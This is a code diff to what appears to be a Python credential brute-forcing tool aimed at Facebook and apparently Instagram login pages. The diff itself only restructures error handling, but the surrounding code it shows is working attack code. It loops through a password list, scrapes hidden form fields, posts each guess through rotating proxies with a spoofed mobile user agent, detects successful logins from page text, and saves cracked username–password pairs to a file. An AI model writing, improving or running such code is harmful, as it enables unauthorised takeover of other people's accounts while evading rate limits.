@@ -39,7 +39,7 @@ else:
   os.makedirs('data', exist_ok = True)
   with open('data/settings.json', 'w') as new_setting:
     format_ = {
-      "settings": True,
+      "settings": False,
       "proxy": False,
       "username": "",
       "email address": "",
@@ -262,8 +262,8 @@ def main():
   bs = beautifulsoup
   command = True
   while command:
-    command = input(f'{yellow}[{blue} 𝙼𝚊𝚒𝚗-𝚖𝚎𝚗𝚞{yellow} ]𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}').strip()
-    
+    command = input(f'{yellow}[{blue} 𝙼𝚊𝚒𝚗-𝚖𝚎𝚗𝚞{yellow} ]𝙴𝚗𝚝𝚎𝚛 𝚊 𝚌𝚘𝚖𝚖𝚊𝚗𝚍 : {plain}')
+    command = command.strip()
     if command.lower() in ['brute', 'brute-force']:
       if set_json["proxy"]:
         temp_disable = input(f'{blue}𝚃𝚎𝚖𝚙𝚘𝚛𝚊𝚛𝚒𝚕𝚢 𝚍𝚒𝚜𝚊𝚋𝚕𝚎 𝚙𝚛𝚘𝚡𝚢 𝚏𝚘𝚛 𝚗𝚘𝚠 [𝚈𝚎𝚜 | 𝙽𝚘] : {plain}').lower()
@@ -304,8 +304,8 @@ def main():
           pass_ = run_brute()
           while i < len(pass_):
             check_password = pass_[i]
+            driver = webdriver.Chrome(options = options)
             try:
-              driver = webdriver.Chrome(options = options)
               driver.get(sign_in_tar)
               time.sleep(5)
 
@@ -400,8 +400,8 @@ def main():
           pass_ = run_brute()
           while i < len(pass_):
             check_password = pass_[i]
+            driver = webdriver.Chrome(options = options)
             try:
-              driver = webdriver.Chrome(options = options)
               driver.get(sign_in_face)
               time.sleep(5)
               page_ = bs(driver.page_source, 'html.parser').text
@@ -516,46 +516,52 @@ def main():
         i = 0
         pass_ = run_brute()
         while i < len(pass_):
-          check_password = pass_[i]
-          agent = {
-            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
-            "Content-Type" : "Html"
-          }
-          caught_proxy = onload_proxy(data = dict)
-          response = requests.get(target_url, proxies = caught_proxy)
-          cookies = {i.name : i.value for i in response.cookies}
+          try:
+            check_password = pass_[i]
+            agent = {
+              "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/537.36",
+              "Content-Type" : "Html"
+            }
+            caught_proxy = onload_proxy(data = dict)
+            response = requests.get(target_url, proxies = caught_proxy)
+            cookies = {i.name : i.value for i in response.cookies}
         
-          target_ = bs(response.text, 'html.parser')
-          post_url = target_.find('form', attrs = {'action' : True}).get('action')
-          hidden_input = target_.find_all('input', attrs = {'type' : 'hidden'})
-          made_data = {}
-          for input_tag in hidden_input:
-            name = input_tag.get('name')
-            value = input_tag.get('value', '')
-            if name != None:
-              made_data.update({f'{name}' : f'{value}'})
+            target_ = bs(response.text, 'html.parser')
+            post_url = target_.find('form', attrs = {'action' : True}).get('action')
+            hidden_input = target_.find_all('input', attrs = {'type' : 'hidden'})
+            made_data = {}
+            for input_tag in hidden_input:
+              name = input_tag.get('name')
+              value = input_tag.get('value', '')
+              if name != None:
+                made_data.update({f'{name}' : f'{value}'})
             
-          form = target_.find_all('form')
-          if form:
-            made_data.update({'name':f'{username_email}'})
-            made_data.update({'pass': f'{check_password}'})
+            form = target_.find_all('form')
+            if form:
+              made_data.update({'name':f'{username_email}'})
+              made_data.update({'pass': f'{check_password}'})
           
-            data_sent = requests.post(f'{response.url}{post_url}', data = made_data, cookies = cookies, headers = agent, proxies = caught_proxy)
+              data_sent = requests.post(f'{response.url}{post_url}', data = made_data, cookies = cookies, headers = agent, proxies = caught_proxy)
           
-            data_sent = bs(data_sent.text, 'html.parser').text
-            print(f'{green}Trying password : {check_password} {plain}')
+              data_sent = bs(data_sent.text, 'html.parser').text
+              print(f'{green}Trying password : {check_password} {plain}')
           
-            if 'Find friends' in data_sent or 'Check your notifications on another device' in data_sent or 'authentication' in data_sent:
-              print(f'{green}[{username_email}] Password found : {check_password} {plain}')
-              save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
-              break
-              payload = False
-            elif 'Find account' in data_sent:
-              print(f'{red}Couldn\'t find the account {username_email}{plain}')
-              break
-              payload = False
+              if 'Find friends' in data_sent or 'Check your notifications on another device' in data_sent or 'authentication' in data_sent:
+                print(f'{green}[{username_email}] Password found : {check_password} {plain}')
+                save_passwords.write(f'{username_email} - {check_password} - Facebook - {time.time()}\n')
+                break
+                payload = False
+              elif 'Find account' in data_sent:
+                print(f'{red}Couldn\'t find the account {username_email}{plain}')
+                break
+                payload = False
           
-          i += 1
+            i += 1
+          except KeyboardInterrupt:
+            payload = False
+            break
+          except Exception as error:
+            print(f'{red}{error}{plain}')
     elif command.lower() in ['html-skinner', 'html']:
       skinning = True
       while skinning:
